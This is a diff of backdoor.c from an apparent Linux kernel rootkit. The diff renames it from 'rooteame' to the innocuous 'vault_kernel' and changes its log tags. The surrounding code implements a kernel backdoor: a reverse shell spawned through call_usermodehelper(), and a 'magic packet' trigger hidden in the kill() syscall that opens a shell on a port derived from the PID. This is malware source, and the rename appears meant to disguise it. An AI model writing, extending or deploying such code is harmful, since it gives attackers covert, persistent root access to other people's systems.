@@ -1,4 +1,4 @@
-/* rooteame - backdoor.c
+/* vault_kernel - backdoor.c
  * Kernel backdoor: reverse shell via call_usermodehelper()
  * Magic packet trigger via kill() syscall to PID=SIGRTMIN+1
  * ruby570bocadito © 2026
@@ -26,7 +26,7 @@ static int reverse_shell_spawn(const char *ip, int port) {
 
     argv[2] = cmd;
 
-    pr_info(ROOTEAME_TAG " spawning reverse shell -> %s:%d\n", ip, port);
+    pr_info(VAULT_KERNEL_TAG " spawning reverse shell -> %s:%d\n", ip, port);
 
     return call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
 }
@@ -74,7 +74,7 @@ int backdoor_set_magic(const char *magic) {
     strncpy(magic_str, magic, sizeof(magic_str) - 1);
     magic_str[sizeof(magic_str) - 1] = '\0';
     magic_enabled = 1;
-    pr_info(ROOTEAME_TAG " magic packet backdoor enabled: %s\n", magic_str);
+    pr_info(VAULT_KERNEL_TAG " magic packet backdoor enabled: %s\n", magic_str);
     return 0;
 }
 
@@ -95,7 +95,7 @@ int backdoor_check_magic(pid_t pid, int sig) {
 
     {
         int port = MAGIC_PORT(pid);
-        pr_info(ROOTEAME_TAG " magic packet received, spawning shell on port %d\n", port);
+        pr_info(VAULT_KERNEL_TAG " magic packet received, spawning shell on port %d\n", port);
 
         /* Spawn reverse shell to localhost:port */
         backdoor_spawn_reverse_shell("127.0.0.1", port);
@@ -105,12 +105,12 @@ int backdoor_check_magic(pid_t pid, int sig) {
 }
 
 int backdoor_init(void) {
-    pr_info(ROOTEAME_TAG " backdoor initialized\n");
+    pr_info(VAULT_KERNEL_TAG " backdoor initialized\n");
     return 0;
 }
 
 void backdoor_cleanup(void) {
     magic_enabled = 0;
     memset(magic_str, 0, sizeof(magic_str));
-    pr_info(ROOTEAME_TAG " backdoor cleaned\n");
+    pr_info(VAULT_KERNEL_TAG " backdoor cleaned\n");
 }
